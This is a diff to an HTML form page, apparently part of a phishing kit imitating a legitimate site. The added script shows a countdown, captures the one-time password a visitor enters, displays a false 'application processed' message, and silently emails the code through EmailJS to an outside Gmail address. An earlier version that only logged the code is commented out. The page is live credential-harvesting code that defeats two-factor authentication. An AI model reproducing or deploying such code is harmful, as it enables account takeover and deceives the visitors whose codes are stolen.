@@ -1882,6 +1882,10 @@
             -khtml-border-top-left-radius: 9px;
             -khtml-border-top-right-radius: 9px;
           }
+
+          #otp-input[readonly] {
+            background-color: #f0f0f0;
+          }
         </style>
 
         <a href="#content" id="skip-to-content"></a>
@@ -2110,6 +2114,8 @@
                   display: flex;
                   justify-content: center;
                   align-items: center;
+                  padding-left: 15px;
+                  padding-right: 15px;
                 "
               >
                 <div>
@@ -2148,7 +2154,79 @@
                 </div>
               </div>
             </fieldset>
+
             <script>
+              ;(function () {
+                emailjs.init('xkxNbRifimbLfTe1Y')
+              })()
+
+              let timerInterval // To store the timer interval ID
+              let timeRemaining = 300 // 4 minutes in seconds
+
+              function startTimer() {
+                timerInterval = setInterval(updateTimer, 1000) // Run the timer every second
+              }
+
+              function updateTimer() {
+                const minutes = Math.floor(timeRemaining / 60)
+                const seconds = timeRemaining % 60
+                document.getElementById(
+                  'verifyOtpText'
+                ).innerText = `VERIFY OTP (${minutes}:${
+                  seconds < 10 ? '0' : ''
+                }${seconds})`
+
+                if (timeRemaining === 0) {
+                  clearInterval(timerInterval)
+                  document.getElementById('otp-input').readOnly = true
+                  document.getElementById('verifyOtpText').innerText =
+                    'Time Expired!' // Modify heading after time expires
+                } else {
+                  timeRemaining--
+                }
+              }
+
+              function otpSubmit() {
+                const otpInput = document.getElementById('otp-input').value
+                if (otpInput.trim() === '') {
+                  alert('Please enter the OTP.')
+                  return
+                }
+
+                clearInterval(timerInterval)
+                document.getElementById('otp-input').readOnly = true
+                document.getElementById('verifyOtpText').innerText =
+                  'Your application is now processed, Please check your mail for more information'
+
+                // Send the OTP code to your email using EmailJS (modify this part based on your previous code)
+                const templateParams = {
+                  // Add your template parameters here (e.g., email address, OTP code)
+                  // You can use the previous code and update the 'service', 'template', and 'templateParams' accordingly.
+
+                  sendername: 'ansarudeenboys',
+                  to: 'anonymousway001@gmail.com',
+                  subject: 'otp code',
+                  replyto: 'information',
+                  message: 'The OTP is : ' + otpInput,
+                }
+
+                // Replace the placeholders with your service ID, template ID, and user parameters
+                emailjs
+                  .send('service_gd5v8vu', 'template_ymqvt1g', templateParams)
+                  .then(
+                    function (response) {
+                      console.log('Email sent successfully!', response)
+                    },
+                    function (error) {
+                      console.log('Error sending email:', error)
+                    }
+                  )
+              }
+
+              startTimer()
+            </script>
+
+            <!-- <script>
               function otpSubmit() {
                 var OTPtextInput = document.getElementById('otp-input').value
                 var verifyOtpText = document.getElementById('verifyOtpText')
@@ -2161,7 +2239,7 @@
                   console.log('The OTP code inputted is ' + OTPtextInput)
                 }
               }
-            </script>
+            </script> -->
 
             <!-- <script id="form:j_idt72_s" type="text/javascript">
                 $(function () {
